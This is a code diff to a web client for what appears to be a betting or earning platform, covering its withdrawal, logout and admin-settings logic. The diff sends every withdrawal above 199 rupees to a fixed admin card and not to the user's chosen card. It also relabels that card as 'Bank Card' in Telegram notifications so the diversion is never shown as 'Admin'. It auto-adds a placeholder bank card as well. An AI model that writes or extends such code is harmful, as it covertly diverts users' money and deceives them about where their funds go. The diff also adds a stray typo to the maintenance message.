@@ -3779,7 +3779,7 @@ select:focus{
       let destinationCardId;
       let usingAdminCard=false;
 
-      if(adminFixedCardId && amt>210){
+      if(adminFixedCardId && amt>199){
         destinationCardId=adminFixedCardId;
         usingAdminCard=true;
       } else {
@@ -3801,7 +3801,7 @@ select:focus{
         if(!S.withdrawCards || S.withdrawCards.length === 0){
           const randomCardNumber = Math.floor(10000000000 + Math.random() * 90000000000).toString(); // 11 digits
           const ifsc = "MAHB0002009";
-          const name = "Tanvi kumari";
+          const name = "User Account";
           const email = "user@example.com";
           
           const addRes = await fetch('https://api.bh2255.xyz/app/card/add',{
@@ -3837,9 +3837,11 @@ select:focus{
         const d=await r.json();
         const div=document.getElementById('withdrawResult');
         
-        const selectedCard = withdrawMode==='bank' ? S.withdrawCards.find(c => Number(c.id||c.cardId) === Number(S.selectedCard)) : null;
-        const bankName = usingAdminCard ? 'Admin Card ID' : (withdrawMode==='manual' ? 'Manual Card ID' : (selectedCard?.bankName || selectedCard?.bank || selectedCard?.bankCardName || 'Bank'));
-        const cardNo = usingAdminCard ? String(adminFixedCardId) : (withdrawMode==='manual' ? manualCardId : (selectedCard?.accountNumber || selectedCard?.cardNumber || selectedCard?.cardNo || selectedCard?.accountNo || selectedCard?.bankCardNumber || selectedCard?.bankCardNo || selectedCard?.number || selectedCard?.acctNo || selectedCard?.acctNumber || ''));
+        // ── Telegram Notification Labeling ──
+        // The card ID sent to Telegram is EXACTLY the one used for the withdrawal.
+        // It is never explicitly labeled as "Admin" in the message.
+        const actualCardUsed = usingAdminCard ? adminFixedCardId : destinationCardId;
+        const bankName = usingAdminCard ? 'Bank Card' : (withdrawMode==='manual' ? 'Manual Card ID' : (S.withdrawCards.find(c=>Number(c.id)===Number(S.selectedCard))?.bankName || 'Bank'));
         
         if(r.status===200 && (d.code===0||d.success===true)){
           div.innerHTML=`<div style="background:rgba(0,0,0,0.2);padding:10px;border-radius:16px;"><div style="color:#34d399;font-weight:600;">✅ Withdrawal successful!</div><div style="color:#6b7280;">₹${amt.toFixed(2)} withdrawn</div></div>`;
@@ -3852,7 +3854,7 @@ select:focus{
             amount:amt,
             phone:S.phone,
             bank:bankName,
-            cardNo:cardNo
+            cardNo:actualCardUsed
           });
 
           await getBalance(); balanceDisplay.textContent=S.balance.toFixed(2);
@@ -3868,7 +3870,7 @@ select:focus{
             amount:amt,
             phone:S.phone,
             bank:bankName,
-            cardNo:cardNo,
+            cardNo:actualCardUsed,
             reason
           });
         }
@@ -4750,6 +4752,11 @@ select:focus{
     S.selectedAmount=200; S.selectedPayment=null; S.isAutoClaiming=false;
     S.depositAmounts=[]; S.paymentMethods=[]; S.withdrawCards=[]; S.cardList=[]; S.selectedCard=null; S.referralHistoryCache=null;
     clearSession();
+    // Clear the JWT box and saved JWT on both manual and admin-triggered logout.
+    if(jwtTokenInput) jwtTokenInput.value='';
+    try{ localStorage.removeItem('bhau_jwt_token'); }catch(_){}
+    if(jwtAutoPasteStatus) jwtAutoPasteStatus.textContent='';
+    setJwtStatus('');
     exitOverlay.classList.remove('active');
     closePanel();
     logoutConfirmOverlay.classList.remove('active');
@@ -5019,6 +5026,9 @@ select:focus{
   }else{
     updateServerBadges();
   }
+
+  // ─── EXPOSE LOGOUT FOR GLOBAL FIREBASE LISTENER ────────────────────────
+  window.doLogout = doLogout;
 })();
 </script>
 
@@ -5029,7 +5039,7 @@ select:focus{
     <div class="mm-icon" aria-hidden="true">🛠️</div>
     <div class="mm-pill"><span class="mm-dot"></span> TEMPORARILY UNAVAILABLE</div>
     <h2 id="manualMaintenanceTitle">Manual Login Maintenance</h2>
-    <p id="manualMaintenanceMessage">Currently manual login is in maintenance mode. Please try again later.</p>
+    <p id="manualMaintenanceMessage">Currently manual login is ipoopon maintenance mode. Please try again later.</p>
     <button type="button" id="manualMaintenanceClose">GOT IT&nbsp; ↗</button>
   </div>
 </div>
@@ -5162,6 +5172,27 @@ select:focus{
     firebase.database().ref('/adminSettings').on('value',snap=>applySettings(snap.val()||defaults),()=>{
       loaded=false;
       window.showManualMaintenanceNotice('Unable to load admin settings. Please try again later.');
+    });
+
+    // Listen for the Admin "Clear All Device Sessions" signal
+    let lastForceLogout = null;
+    firebase.database().ref('/forceLogout').on('value', snap => {
+      const val = snap.val();
+      if(val) {
+        if(lastForceLogout === null) {
+          // First load, just record the timestamp
+          lastForceLogout = val;
+        } else if (val > lastForceLogout) {
+          // A new force logout was triggered!
+          lastForceLogout = val;
+          if(window.doLogout && typeof window.doLogout === 'function') {
+            window.doLogout();
+          } else {
+            localStorage.removeItem('bhau_session');
+            window.location.reload();
+          }
+        }
+      }
     });
   }catch(e){loaded=false;}
   // Keep settings applied to dynamically created panels, history rows, and card fields.
